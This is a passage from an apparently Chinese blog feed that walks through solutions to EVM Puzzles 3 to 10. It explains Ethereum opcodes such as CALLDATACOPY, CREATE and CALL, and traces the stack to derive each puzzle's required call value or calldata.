href="https://learnblockchain.cn/2019/10/05/evm-data%EF%BC%89">https://learnblockchain.cn/2019/10/05/evm-data）</a></p><p>CALLDATASIZE 指令获取调用数据的大小（以字节为单位），并将其压入到堆栈中。所以我们只需要输入 CALLDATASIZE 的值为 4个字节，一个字节是8位，在16进制中一个字节为2个16进制位，只需要输入<code>0x11111111</code>，CALLDATASIZE 就会返回 4 个字节，即可让接下来的 JUMP 指令跳转到 JUMPDEST，完成该题目。</p><h3 id="Puzzle-4"><a href="#Puzzle-4" class="headerlink" title="Puzzle 4"></a>Puzzle 4</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 4 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      18      XOR</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br><span class="line">0A      5B      JUMPDEST</span><br><span class="line">0B      00      STOP</span><br></pre></td></tr></table></figure><p>解决这道题需要了解 XOR 指令，该指令会将俩个数字的二进制形式按位进行异或，如 5 和 3 的异或表示为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>:<span class="number">00000000000000000000000000000101</span></span><br><span class="line"><span class="number">3</span>:<span class="number">00000000000000000000000000000011</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span> xor <span class="number">3</span>:<span class="number">00000000000000000000000000000110</span></span><br></pre></td></tr></table></figure><p>分析题目需要跳转到 JUMPDEST 指令，即第 10 条指令，意味着在执行 XOR 后栈顶的元素为 10(0A),，而 CODESIZE 执行后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0c your_input <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以当 0c 和 输入的值进行异或后得到的值为 0a，所以需要输入的值为 0a xor 0c == 6，即可完成该题目。</p><h3 id="Puzzle-5"><a href="#Puzzle-5" class="headerlink" title="Puzzle 5"></a>Puzzle 5</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 5 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34          CALLVALUE</span><br><span class="line">01      80          DUP1</span><br><span class="line">02      02          MUL</span><br><span class="line">03      610100      PUSH2 0100</span><br><span class="line">06      14          EQ</span><br><span class="line">07      600C        PUSH1 0C</span><br><span class="line">09      57          JUMPI</span><br><span class="line">0A      FD          REVERT</span><br><span class="line">0B      FD          REVERT</span><br><span class="line">0C      5B          JUMPDEST</span><br><span class="line">0D      00          STOP</span><br><span class="line">0E      FD          REVERT</span><br><span class="line">0F      FD          REVERT</span><br></pre></td></tr></table></figure><p>首先需要学习几个新的指令，<strong>DUP</strong> 指令表示复制栈顶上第一个位置的值，并将其压入栈顶，同样，dup2表示将栈中第二个位置的值复制并压入栈顶。dup指令包括dup1-dup16；<strong>MUL</strong>指令表示获取栈中的前俩个值，将他们相乘的结果压入栈顶；<strong>EQ</strong>指令表示获取栈中前俩个位置的值并比较运行结果，当运行结果相同时返回1，否则返回0，并将返回的结果压入栈顶。</p><p>在执行 DUP1 后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[your_input your_input <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 MUL 操作，将前俩个值相乘，并将结果压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[mul_result <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>此时执行 PUSH2 0100，将2个字节的十六进制数0100（256）压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0100</span> mul_result <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 EQ 操作，判断堆栈上的前俩个值，比较其值是否相同，假设相等，将 1压入栈顶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行  PUSH1 0，它将 <code>0c</code> 压入栈顶，JUMPI 表示有条件的跳转，它有俩个参数，第一个参数表示跳转的位置，第二个参数表示是否跳转，此时栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0c <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当栈中的第二个元素的值为 1 时，发生跳转，跳转到位置 0c，正好是 JUMPDEST，完成该题目。所以往上推输入的值应该是16，使 ${input}^2=256$，然后通过 EQ 判断，执行 JUMPI。</p><h3 id="Puzzle-6"><a href="#Puzzle-6" class="headerlink" title="Puzzle 6"></a>Puzzle 6</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 6 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      6000      PUSH1 00</span><br><span class="line">02      35        CALLDATALOAD</span><br><span class="line">03      56        JUMP</span><br><span class="line">04      FD        REVERT</span><br><span class="line">05      FD        REVERT</span><br><span class="line">06      FD        REVERT</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      FD        REVERT</span><br><span class="line">0A      5B        JUMPDEST</span><br><span class="line">0B      00        STOP</span><br></pre></td></tr></table></figure><p>这道题遇到了新的指令<code>CALLDATALOAD</code>，该指令需要一个参数 **CALLDATALOAD(p)**表示从附加在交易中的 <strong>calldata</strong> 中获取数据，即从位置 p 的开始获取调用数据。例如，当栈顶为 08 时，执行 <strong>CALLDATALOAD</strong> 表示，所有从 byte 8 到 byte 32 的 calldata会被压入栈顶，如果 calldata 是 64 字节并且需要访问序列的第二个 32 个字节，可以先压入<code>20</code>堆栈，然后使用<code>CALLDATALOAD</code>来获取序列的第二个 32 个字节。</p><p>所以这道题需要输入的 calldata 为 a，但是由于在发送 calldata 时，当 calldata 不满足32字节时会从左向右进行填充，所以 0a 就会变成 <code>a00000000000000000000000000000000000000000000000000000000000000</code>，所以可以向 0x0a 在左边填充 0 即：<code>0x000000000000000000000000000000000000000000000000000000000000000a</code>。</p><h3 id="Puzzle-7"><a href="#Puzzle-7" class="headerlink" title="Puzzle 7"></a>Puzzle 7</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 7 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      3B        EXTCODESIZE</span><br><span class="line">0C      6001      PUSH1 01</span><br><span class="line">0E      14        EQ</span><br><span class="line">0F      6013      PUSH1 13</span><br><span class="line">11      57        JUMPI</span><br><span class="line">12      FD        REVERT</span><br><span class="line">13      5B        JUMPDEST</span><br><span class="line">14      00        STOP</span><br></pre></td></tr></table></figure><p><code>CALLDATASIZE</code>需要输入特定大小的 calldata 来解决这个难题，calldata 的大小的值被压入栈后，继续执行<code>PUSH1 00</code>，<code>DUP1</code>，此时栈中的结构是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> calldata_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>CALLDATACOPY</strong> 指令，该指令从交易中复制数据并将其保存在内存中，执行 <strong>CALLDATACOPY</strong> 需要三个参数，<code>[destOffset offset size]</code>，destOffset 表示要存储复制结果的偏移量，offset 表示要复制的调用数据中的字节偏移量，size表示复制的大小。</p><p>在执行 <strong>CALLDATACOPY</strong> 时，<code>destOffset</code>告诉程序内存中的哪个槽来存储从 calldata 复制的数据。<code>offset</code>表示从哪里开始复制调用数据（就像<code>CALLDATALOAD</code>在最后一个示例中确实如此）并且<code>size</code>告诉程序要在内存中存储多少字节序列。在这个过程中，栈顶的所有三个元素都被消耗掉了，所以在执行完 CALLDATACOPY 后栈中的结构是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当<code>CALLDATALOAD</code>指令执行时，它会将 calldata 存储在 memory slot<code>0</code>中，从 byte 开始<code>0</code>，并存储整个 calldata 的大小。</p><p>紧接着会执行<code>CALLDATASIZE</code> <code>PUSH1 00</code> <code>PUSH1 00</code>，执行完后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> calldata_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>CREATE</strong> 指令，该指令会创建一个账户（合约或EOA）。执行 CRATE 指令时需要三个参数，[value offset size]，value 是发送创建合约的 wei 的值，offset 是部署时运行的字节码的内存位置，size 表示字节码的大小。当使用 CREATE 部署新合约时，偏移量的字节码不是新合约的字节码，而是在部署期间被执行的偏移量的字节码，并且返回值是新创建合约的字节码。</p><blockquote><p>这里理解起来有一些抽象，举个例子，如果使用 CREATE 指令来创建一个合约，且部署这个合约的字节码为<code>0x6160016000526002601Ef3</code>，那么由此字节码序列的返回值为 <strong>6001</strong>，因此新创建的合约的字节码为 <strong>6001</strong>，即<code>PUSH1 01</code>，所以当调用这个合约的执行就会执行<code>PUSH1 01</code>。</p></blockquote><p>当 <strong>CREATE</strong> 指令执行后，栈顶的三个值被使用，并且被部署的合约的地址会被压入栈顶，在执行完成后，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p> 然后就会遇到 <strong>EXTCODESIZE</strong> 指令，该指令需要一个参数，即 **EXTCODESIZE(p)**，返回 p 处的代码的大小。执行完成后继续执行 <code>PUSH1 01</code>，此时栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">01</span> address_code_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>紧接着执行 EQ 指令，会检查栈中前俩个值是否相等，并将判断结果压入栈中，然后继续执行<code>PUSH1 13</code>和<code>JUMPI</code>，压入栈中的 13 即表示 条件跳转的位置，而 EQ 判断的结果表示是否跳转，即意味着我们要提供一个使<code>address_code_size == 01 </code>的 calldata 。</p><p>所以我们只需要传入一个 calldata 使得执行，EXTCIDESIZE 时返回的结果为 1即可。执行 CREATE 操作码时，只有 RETURN 操作码返回的代码才是未来调用部署合约时执行的“运行时代码”。字节码的另一部分只使用一次，仅用于构造函数部分。字节码的另一部分只使用一次，仅用于该<code>constructor</code>部分。因此，我们<code>calldata</code>可以在其中包含我们想要的所有代码，但我们需要确保返回的代码（运行时代码）只有 1 条指令。我们希望我们部署的智能合约只有<code>STOP</code>指令（操作码<code>00</code>）。必须发送到<code>CREATE</code>操作码的代码是这样的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00 // 00 代表STOP</span><br><span class="line">PUSH1 00 // 这将用作 MSTORE8 的偏移量，在内存中存储 1 个字节</span><br><span class="line">MSTORE8 // 将从偏移量 0 开始在内存中存储 `00` 值（来自第一个 PUSH1）</span><br><span class="line"></span><br><span class="line">PUSH1 01 // 返回多少字节</span><br><span class="line">PUSH1 00 // 从哪个内存偏移量返回这些字节</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>上面的操作码转为字节码就是<code>0x600060005360016000F3</code>，所以我们只需要将其作为 calldata 传入即可完成该题目，它将使用该 calldata 来创建和部署一个新合约，该合约的运行时代码为<code>00（STOP）</code></p><h3 id="Puzzle-8"><a href="#Puzzle-8" class="headerlink" title="Puzzle 8"></a>Puzzle 8</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 8 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      6000      PUSH1 00</span><br><span class="line">0D      80        DUP1</span><br><span class="line">0E      80        DUP1</span><br><span class="line">0F      80        DUP1</span><br><span class="line">10      80        DUP1</span><br><span class="line">11      94        SWAP5</span><br><span class="line">12      5A        GAS</span><br><span class="line">13      F1        CALL</span><br><span class="line">14      6000      PUSH1 00</span><br><span class="line">16      14        EQ</span><br><span class="line">17      601B      PUSH1 1B</span><br><span class="line">19      57        JUMPI</span><br><span class="line">1A      FD        REVERT</span><br><span class="line">1B      5B        JUMPDEST</span><br><span class="line">1C      00        STOP</span><br></pre></td></tr></table></figure><p>这道题目又会遇到几个新的指令：</p><ul><li><p><strong>SWAP5：</strong>将位置 0 中的操作码与位置 5 的操作码交换， SWAP 操作包括 SWAP1～SWAP6。</p></li><li><p><strong>GAS：</strong>将交易中剩余的 gas 压入堆栈，会消耗 2 gas。</p></li><li><p><strong>CALL：</strong>创建一个新的子上下文（与外部交互的每个操作都会创建一个新的上下文），并执行外部账户中存在的代码没，如果调用失败，则将 0 压入栈中，否则将 1 压入栈中。如果调用的账户中没有代码，则返回 true。 <strong>CALL</strong> 操作需要 7 个参数，</p><p>— <code>gas</code>：要发送到为执行创建的子上下文的 gas 量<br>— <code>address</code>：将执行上下文的地址<br>— <code>value</code>：以“wei”为单位的值以发送到地址<br>— <code>argsOffset</code>：内存中的字节偏移量（以字节数为单位）<br>— <code>argsSize</code>：从内存中复制的字节大小，具有先前指定的偏移量<br>— <code>retOffset</code>：内存中的字节偏移量，以字节为单位存储执行返回的返回数据<br>— <code>retSize</code>：要从返回的数据中复制的字节大小</p></li></ul><p>然后再来分析代码过程，首先会执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLDATASIZE</span><br><span class="line">PUSH1 00</span><br><span class="line">DUP1</span><br><span class="line">CALLDATACOPY</span><br><span class="line">CALLDATASIZE</span><br><span class="line">PUSH1 00</span><br><span class="line">PUSH1 00</span><br><span class="line">CREARTE</span><br></pre></td></tr></table></figure><p>我们传入的 CALLDATA 会创建一个新的合约地址并返回部署地址，当以上操作执行完成后，栈中的结构为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>接下来执行 5 条与 <strong>CALL</strong> 有关的指令，然后执行 <strong>CALL</strong> 指令，该指令创建一个新的子上下文并执行给定帐户的代码，然后回到当前的账户。即 <strong>CALL</strong> 指令用于与另一个合约进行交互</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br></pre></td></tr></table></figure><p>当以上执行被执行完后，栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 <strong>SWAP5</strong> ，该指令会将栈中的第 0 个和第 5 个值进行交换，执行完成后，栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 <strong>CALL</strong> 指令，如果子上下文恢复，则返回 0，否则返回 1。在 <strong>CALL</strong> 指令执行完后，会继续执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00</span><br><span class="line">EQ</span><br></pre></td></tr></table></figure><p>意味着需要如果要继续向下执行，就需要 <strong>EQ</strong> 返回 0，即意味着 <strong>CALL</strong> 也需要返回 0。所以就需要输入导致 <strong>CALL</strong> 执行失败的 <strong>CALLDATA</strong>。要让 <strong>CALL</strong> 执行失败有三种方法：</p><ol><li>没有足够的gas</li><li>栈中的参数不够</li><li>如果当前执行的上下文来自 <strong>STATICCALL</strong>，并且wei 的值不是 0。</li></ol><p>需要注意的是，如果 <strong>CALL</strong> 调用的地址中没有代码，那么 <strong>CALL</strong> 会始终返回 true。</p><p>在部署时运行的字节码的返回值会成为新创建的合约的合约的字节码，所以我们可以利用字节码传入 <strong>CALLDATA</strong>，使该字节码在运行时返回 <strong>REVERT</strong> 即可。，所以我们需要传递的数据是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//将 REVERT 的操作码作为合约代码存储在内存中</span><br><span class="line">PUSH1 FD</span><br><span class="line">PUSH1 00</span><br><span class="line">MSTORE 8</span><br><span class="line"></span><br><span class="line">//使构造函数返回存储的运行时代码</span><br><span class="line">PUSH1 01</span><br><span class="line">PUSH1 00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>即 <strong>CALLDATA</strong> 是 <code>0x60FD60005360016000F3</code> 。</p><h3 id="Puzzle-9"><a href="#Puzzle-9" class="headerlink" title="Puzzle 9"></a>Puzzle 9</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 9 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6003      PUSH1 03</span><br><span class="line">03      10        LT</span><br><span class="line">04      6009      PUSH1 09</span><br><span class="line">06      57        JUMPI</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      5B        JUMPDEST</span><br><span class="line">0A      34        CALLVALUE</span><br><span class="line">0B      36        CALLDATASIZE</span><br><span class="line">0C      02        MUL</span><br><span class="line">0D      6008      PUSH1 08</span><br><span class="line">0F      14        EQ</span><br><span class="line">10      6014      PUSH1 14</span><br><span class="line">12      57        JUMPI</span><br><span class="line">13      FD        REVERT</span><br><span class="line">14      5B        JUMPDEST</span><br><span class="line">15      00        STOP</span><br></pre></td></tr></table></figure><p>首先了解俩个新的指令：</p><ul><li><strong>LT：</strong> 从栈中弹出两个值并判断<code>value0 &lt; value1</code>，将其结果压入栈中，若为真则压入 1，否则压入 0</li><li><strong>CALLVALUE:</strong> 将当前调用的 wei 的值压入栈中</li></ul><p>首先看第一处的 <strong>JUMPI</strong>，在执行完 <strong>JUMPI</strong> 指令之前栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">09</span> LT_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以需要执行 <strong>JUMPI</strong> 的条件就是 <strong>LT_result</strong> 不为 0，即输入的 value 需要 大于 3。</p><p>然后继续执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLVALUE</span><br><span class="line">CALLDATASIZE</span><br><span class="line">MUL</span><br><span class="line">PUSH1 08</span><br><span class="line">EQ</span><br><span class="line">PUSH1 14</span><br><span class="line">JUMPI</span><br></pre></td></tr></table></figure><p> 在执行 <strong>JUMPI</strong> 之前，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">14</span> EQ_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以如果要顺利执行 <strong>JUMPI</strong> 的话，就需要<code>CALLVALUE * CALLDATASIZE == 8</code>，而又需要 <code>CALLDATAVALUE &gt; 3</code>，因此我们传入的 <strong>CALLVALUE</strong> 和 <strong>CALLDATASIZE</strong> 分别是 2 和 4（0x11223344）</p><h3 id="Puzzle-10"><a href="#Puzzle-10" class="headerlink" title="Puzzle 10"></a>Puzzle 10</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#############</span></span><br><span class="line"><span class="comment"># Puzzle 10 #</span></span><br><span class="line"><span class="comment">#############</span></span><br><span class="line"></span><br><span class="line">00      38          CODESIZE</span><br><span class="line">01      34          CALLVALUE</span><br><span class="line">02      90          SWAP1</span><br><span class="line">03      11          GT</span><br><span class="line">04      6008        PUSH1 08</span><br><span class="line">06      57          JUMPI</span><br><span class="line">07      FD          REVERT</span><br><span class="line">08      5B          JUMPDEST</span><br><span class="line">09      36          CALLDATASIZE</span><br><span class="line">0A      610003      PUSH2 0003</span><br><span class="line">0D      90          SWAP1</span><br><span class="line">0E      06          MOD</span><br><span class="line">0F      15          ISZERO</span><br><span class="line">10      34          CALLVALUE</span><br><span class="line">11      600A        PUSH1 0A</span><br><span class="line">13      01          ADD</span><br><span class="line">14      57          JUMPI</span><br><span class="line">15      FD          REVERT</span><br><span class="line">16      FD          REVERT</span><br><span class="line">17      FD          REVERT</span><br><span class="line">18      FD          REVERT</span><br><span class="line">19      5B          JUMPDEST</span><br><span class="line">1A      00          STOP</span><br></pre></td></tr></table></figure><p>还是先学习一下新的操作码：</p><ul><li><strong>GT</strong>：从堆栈中弹出 2 个值并判断<code>value0 &lt; value1</code>，如果结果为 true 则压入 1，否则压入 0</li><li><strong>MOD：</strong>从堆栈中弹出 2 个值并将结果其运算<code>value0 % value1</code>。若分母 ( <code>value1</code>) 是<code>0</code>则结果为 0</li><li><strong>ISZERO：</strong>从堆栈中弹出一个值并判断`value0 === 0，将判断结果压入栈</li></ul><p>在执行完 <strong>SWAP1</strong> 后栈中的结构如下</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[1b callvalue <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>GT</strong> 指令，如果要顺利执行 <strong>JUMPI</strong>，就是需要 <strong>GT</strong> 指令返回的值为 1，因此我们输入的 <strong>CALLVALUE</strong> 必须要小于 1b(27)，然后就会跳到第 8 条指令。</p><p>接着执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLDATASIZE </span><br><span class="line">PUSH2 0003</span><br><span class="line">SWAP1</span><br></pre></td></tr></table></figure><p>以上指令将 CALLDATA 的大小和 0003 压入栈中，并交换他们的位置，此时栈中的结构为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[calldata_size <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>MOD</strong> 指令，该指令会进行取模运算，将得到结果压入栈中，紧接着执行 <strong>ISZERO</strong> 指令，判断栈顶元素的值是否为 0。然后继续往下执行，当执行到 <strong>JUMPI</strong>  时，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0A+CALLVALUE ISZERO_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>由于需要继续往下执行 <strong>JUMPI</strong> ，所在在这里的 <strong>ISERO_result</strong> 的值必须为 1，即意味着上边 <strong>MOD</strong> 运算的结果为 0，且<code>0A+CALLVALUE ISZERO_result == 0x19(25)</code>，所以 <strong>CALLVALUE</strong> 的值为 15，<strong>CALLDATASIZE</strong> 的值为 0 即可。</p><p><img src="/image/evm-puzzles.assets/2.png" alt="2"></p><p>到这里就完成了所有的题目，在完成这些题目的过程中既掌握了不少 EVM opcode 的用法，也了解了 EVM 的基本运行机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Evm-puzzles 是一个以太坊操作码的挑战，每道题都会提供一些列操作码，并提示输入正确的交易值或者调用数据。通过Evm-puzzles可以了解EVM操作码的运行机制&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/image/evm-puzzles.assets/1.png&quot; a</summary>
      
    
    
    
    <category term="Solidity" scheme="https://banana69.site/categories/Solidity/"/>
    
    
    <category term="Solidity" scheme="https://banana69.site/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>数字签名原理和过程</title>
    <link href="https://banana69.site/2022/06/17/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    <id>https://banana69.site/2022/06/17/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</id>
    <published>2022-06-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:31:50.010Z</updated>
    
